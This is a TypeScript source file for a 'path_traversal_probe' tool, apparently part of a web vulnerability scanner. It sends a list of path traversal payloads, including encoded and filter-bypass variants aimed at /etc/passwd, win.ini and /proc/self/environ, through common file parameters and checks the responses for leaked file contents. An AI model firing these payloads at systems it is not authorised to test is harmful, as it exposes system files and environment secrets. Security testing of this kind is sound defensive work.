import { Tool, ToolInput, ToolOutput } from '@shared/types/tool';

export const PathTraversalProbeTool: Tool = {
    name: 'path_traversal_probe',
    description: 'Tests for Path Traversal vulnerabilities.',

    async run(input: ToolInput, signal?: AbortSignal): Promise<ToolOutput> {
        const { target, contextParams } = input;
        const base = contextParams?.baseUrl || target;
        const payloads = [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',
            '../../../../proc/self/environ',
            '/etc/passwd',
            '....//....//....//etc/passwd',
            '..%252f..%252f..%252fetc/passwd',
            '../../../../../../../../../../../../etc/passwd'
        ];

        let requestsMade = 0;
        const findings: string[] = [];
        let vulnerabilityData: any = null;

        for (const payload of payloads) {
            try {
                requestsMade++;
                const baseUrlObj = new URL(target, base);
                const params = ['file', 'path', 'doc', 'image', 'include'];

                for (const param of params) {
                    const testUrl = new URL(baseUrlObj.toString());
                    testUrl.searchParams.set(param, payload);

                    const response = await fetch(testUrl.toString(), { signal });
                    const text = await response.text();

                    if (text.includes('root:x:0:0:') || text.includes('[extensions]') || text.includes('PATH=')) {
                        findings.push(`Verified Path Traversal at ${target} via parameter '${param}'`);
                        vulnerabilityData = {
                            vulnerability: 'Path Traversal',
                            payload,
                            parameter: param,
                            evidence: "Sensitive system file content leaked in response.",
                            remediation: "Use file identifiers (IDs) instead of paths, or strictly validate and canonicalize input."
                        };
                        break;
                    }
                }
                if (findings.length > 0) break;
            } catch (e: any) {
                // Ignore
            }
        }

        return { findings, requestsMade, data: vulnerabilityData || { status: 'clean' } };
    }
};
